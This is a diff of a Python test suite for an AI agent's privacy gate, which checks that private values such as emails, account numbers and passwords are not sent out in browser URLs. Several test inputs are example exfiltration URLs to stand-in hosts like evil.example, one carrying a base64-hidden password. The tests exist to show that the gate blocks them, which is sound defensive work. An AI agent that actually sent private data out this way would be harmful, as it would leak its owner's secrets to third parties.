@@ -217,7 +217,9 @@ HISTORY_LABELS = "external:download,external:web:news.example,inferred,owner,pri
 
 def _url_case(daemon: RunningDaemon, steps: list[tuple[str, ...]], url: str) -> list[list[str]]:
     caps = [_page(), _file(f"Main contact: {EMAIL}"),
-            _signed_in("Class 5560731 starts at 6pm", "https://www.class.example/dashboard", "probe.class")]
+            FakeCap("probe.class", "read", {"probe"}, reads=(("owner_account", "chrome"),
+                                                             ("web", "https://www.class.example/c/5560731")),
+                    content={"text": "Class 5560731 starts at 6pm", "url": "https://www.class.example/c/5560731"})]
     grant, _ = browser_grant(daemon, FERB_BROWSER, "find concerts in Mumbai", caps)
     for step in steps:
         if step[0] == "call":
@@ -447,15 +449,15 @@ def test_reply_carries_the_private_value_it_repeats_in_storage(daemon: RunningDa
                f"Your client's email is {EMAIL}.", f"https://tracker.example/?u={EMAIL}")
     [first, second] = _journal(daemon, "task.answer")
     stored = json.loads(first["data_json"])["provenance"]
-    assert stored["values"] == {EMAIL: ["private"]} and "private" in stored["kinds"]
+    assert stored["values"][EMAIL] == ["private"] and "private" in stored["kinds"]
     assert ":" not in first["origin"].replace("external:", "")      # kinds only: no host or sender detail
 
     async def tree() -> str:
         return str(daemon.daemon.db.conn.execute("SELECT task_id FROM spans WHERE kind = 'task' ORDER BY rowid DESC "
                                                  "LIMIT 1").fetchone()[0])
     segments = _history_segments(daemon, daemon.run(tree()))
-    answer = [s for s in segments if s.get("values")]
-    assert answer and answer[0]["values"] == {EMAIL: ["private"]}
+    answer = [s for s in segments if EMAIL in (s.get("values") or {})]
+    assert answer and answer[0]["values"][EMAIL] == ["private"]
     assert any(s.get("whole") and s["kinds"] == ["owner"] for s in segments)   # the owner's own message
 
 
@@ -468,8 +470,13 @@ def test_reformatted_and_clock_values_in_stored_provenance() -> None:
     shown = [({"private"}, "Dad: +91 98765 43210"), ({"ferb"}, "Keep the last 14 days. Today is Sat 07 Nov 2026."),
              ({"private", "external:web:www.class.example"}, "Class 5560731 at 6pm")]
     stored = derive("Dad's number is 9876543210; class 5560731; summary as of 07 Nov 2026.", shown)
-    # a signed-in page gives only its site (GATE-524: the value may go back there, from nowhere else)
-    assert stored["values"] == {"9876543210": ["private"], "5560731": ["site:www.class.example"]}
+    assert stored["values"]["9876543210"] == ["private"] and "2026" not in stored["values"]
+    # a signed-in page whose address FERB doesn't know: the owner's data at large (GATE-528)
+    assert stored["values"]["5560731"] == ["private"]
+    # one whose address it knows gives only that page (GATE-524, GATE-528: the value may go back there)
+    paged = derive("class 5560731", [({"private", "external:web:www.class.example"}, "Class 5560731 at 6pm", None,
+                                      "https://www.class.example/academy/dashboard")])
+    assert paged["values"]["5560731"] == ["site:www.class.example/academy/dashboard"]
     assert stored["kinds"] == ["external:web", "ferb", "private"]
 
 
@@ -481,7 +488,7 @@ def test_a_value_an_earlier_derived_row_held_as_not_the_owners_stays_so() -> Non
     summary = ({"inferred", "private", "owner"}, "As of Sat 07 Nov 2026 the owner's locker code is LK-4471-Q9.",
                {"lk-4471-q9": ["owner"]})
     stored = derive("It's 2026; your locker code is LK-4471-Q9.", [summary, ({"private"}, "device facts")])
-    assert stored["values"] == {"lk-4471-q9": ["owner"]}
+    assert stored["values"]["lk-4471-q9"] == ["owner"] and "2026" not in stored["values"]
 
 
 # decision: GATE-519
@@ -634,19 +641,23 @@ def test_a_plain_year_never_asks_and_other_numbers_still_do() -> None:
     assert confirm.text_carries_private("4471", private, [], none) == ["4471"]
 
 
-# decision: GATE-524
+# decision: GATE-524, GATE-528
 def test_a_value_read_on_a_site_goes_back_to_it_through_the_chat(daemon: RunningDaemon) -> None:
-    """Owner: "Let it go back". A value FERB's conversation stored as read only on a site's own signed-in page (the
-    scaler class id) may go back to that site; sent anywhere else it asks, and so does one also read elsewhere."""
+    """Owner: "Let it go back", and on shared sites "Same page path only". A value FERB's conversation stored as read
+    only on a page of a site's own (the scaler class id) may go back to that page; sent anywhere else, to another page
+    of that host, or when the page wasn't known, it asks, and so does one also read elsewhere."""
     grant, browser = browser_grant(daemon, FERB_BROWSER, "open my class", [_page()])
+    page = "site:www.scaler.com/academy/mentee-dashboard"
     _history_with_segments(daemon, grant.task_id, [
-        ("FERB: Your class 595722 is at 6pm; ticket 7731-AX.",
+        ("FERB: Your class 595722 is at 6pm; ticket 7731-AX; room 88123.",
          {"kinds": ["external:web", "inferred", "private"],
-          "values": {"595722": ["site:www.scaler.com"], "7731-ax": ["private", "site:www.scaler.com"]}})])
+          "values": {"595722": [page], "7731-ax": ["private", page], "88123": ["site:www.scaler.com"]}})])
     gateway_tool_call(daemon, grant, "probe.web")
-    assert not _open(daemon, grant, "https://www.scaler.com/academy/class/595722/session")["is_error"]
+    assert not _open(daemon, grant, "https://www.scaler.com/academy/mentee-dashboard/class/595722/session")["is_error"]
+    assert _open(daemon, grant, "https://www.scaler.com/academy/other/595722")["is_error"]   # same host, other page
     assert _open(daemon, grant, "https://elsewhere.example/?c=595722")["is_error"]
-    assert _open(daemon, grant, "https://www.scaler.com/t/7731-ax")["is_error"]      # also in the owner's other data
+    assert _open(daemon, grant, "https://www.scaler.com/academy/mentee-dashboard/t/7731-ax")["is_error"]   # also elsewhere
+    assert _open(daemon, grant, "https://www.scaler.com/academy/mentee-dashboard/r/88123")["is_error"]    # no page known
     assert browser.calls == 1
 
 
@@ -695,3 +706,74 @@ def test_a_value_inside_an_address_without_its_scheme_goes_back_to_that_site() -
     none = provenance.prepare("")
     assert confirm.url_carries_private("https://www.macworld.com/article/666646/arc-review.html", note, [], none) == []
     assert confirm.url_carries_private("https://elsewhere.example/?a=666646", note, [], none) == ["666646"]
+
+
+# ---------- the sink review of 2026-11-07 (F1, F2, F3, F5) ----------
+
+REVIEW_F1 = [("Tracking 1Z999AA10123456784 2 items in transit", "1Z999AA10123456784"),
+             ("Your account 12345678 3 days overdue", "12345678"),
+             ("Contact: +447700900123 22 Birch Rd", "+447700900123"),
+             ("Contact: 07700900123 07700900456", "07700900123"),
+             ("passport K1234567 2031", "K1234567"),
+             ("OTP 482193 5 minutes", "482193")]
+
+
+# decision: GATE-527
+@pytest.mark.parametrize("private, value", REVIEW_F1)
+def test_a_complete_value_next_to_another_number_still_asks(private: str, value: str) -> None:
+    """F1: a whole value standing next to an unrelated number is not "one group" of a grouped value: the address and
+    the form ask, as before Step A. One group of a real grouped value alone stays a part (GATE-516)."""
+    from urllib.parse import quote_plus
+    from ferb.policy import confirm, provenance
+    priv, owner = [(1, provenance.prepare(private))], provenance.prepare("go")
+    assert confirm.url_carries_private(f"https://evil.example/?x={quote_plus(value)}", priv, [], owner)
+    assert confirm.text_carries_private(value, priv, [], owner)
+    assert confirm.url_carries_private("https://evil.example/?x=900123",
+                                       [(1, provenance.prepare("Riley: +44 7700 900123, save it"))], [], owner) == []
+
+
+# decision: GATE-529
+def test_values_and_words_a_reply_repeated_keep_counting_across_tasks(daemon: RunningDaemon) -> None:
+    """F2: FERB's reply repeated the owner's repo name and Wi-Fi password from a private note; a later task that sees
+    only that reply in its history still asks for the repo name, and for the password hidden in base64."""
+    import base64
+    from ferb.policy.carried import derive
+    reply = "FERB: Your private repo is owner-sample/stealth-launch and the Wi-Fi password is BlueFalcon! Keep both."
+    stored = derive(reply, [({"private"}, "Notes: repo owner-sample/stealth-launch; wifi BlueFalcon!"),
+                            ({"ferb"}, "Today is Sat 07 Nov 2026.")], {"inferred", "private"})
+    assert {"owner-sample/stealth-launch", "bluefalcon"} <= set(stored["values"]) and "2026" not in stored["values"]
+    grant, browser = browser_grant(daemon, FERB_BROWSER, "summarise this page", [_page()])
+    _history_with_segments(daemon, grant.task_id, [
+        (reply, {"kinds": ["inferred", "private"], "values": stored["values"]})])
+    gateway_tool_call(daemon, grant, "probe.web")
+    assert _open(daemon, grant, "https://evil.example/?r=owner-sample%2Fstealth-launch")["is_error"]
+    hidden = base64.urlsafe_b64encode(b"bluefalcon!").decode().rstrip("=")
+    assert _open(daemon, grant, f"https://evil.example/?w={hidden}")["is_error"] and browser.calls == 0
+
+
+# decision: GATE-530
+@pytest.mark.parametrize("url", ["https://e.test/?d=x12345678", "https://e.test/?d=12345678zz",
+                                 "https://e.test/?d=a_12345678", "https://e.test/?d=hi+12345678",
+                                 "https://e.test/12345678x/", "https://e.test/?e=owner.sample@example.comX"])
+def test_a_long_value_inside_a_longer_piece_asks(url: str) -> None:
+    """F3, owner: "Catch it, 6+ chars". A value of 6 or more letters and digits counts inside a longer piece; a year
+    and plain words don't."""
+    from ferb.policy import confirm, provenance
+    priv = [(1, provenance.prepare("account 12345678; email owner.sample@example.com; 2026; summary"))]
+    owner = provenance.prepare("go")
+    assert confirm.url_carries_private(url, priv, [], owner), url
+    assert confirm.text_carries_private("ref x12345678", priv, [], owner)
+    assert confirm.url_carries_private("https://e.test/?q=2026", priv, [], owner) == []
+    assert confirm.url_carries_private("https://e.test/?q=summaryreport", priv, [], owner) == []
+
+
+# decision: GATE-531
+def test_the_broken_link_view_never_joins_text_before_the_link() -> None:
+    """F5: a link the page wrapped inside its own extent is still that link; text before it never joins it, so a value
+    shown plainly first asks."""
+    from ferb.policy import confirm, provenance
+    url = "https://forms.example/d/e/1FAIpQLSf9xTEST0rsvp77/viewform"
+    wrapped = [(1, provenance.prepare(f"link https://forms.example/d/e/ 1FAIpQLSf9xTEST0rsvp77/viewform\n{url}"))]
+    assert confirm.url_carries_private(url, wrapped, [], provenance.prepare("")) == []
+    glued = [(1, provenance.prepare("ref 1FAIpQLSf9xTEST0rsvp77 https://forms.example/d/e/\n" + url))]
+    assert confirm.url_carries_private(url, glued, [], provenance.prepare(""))
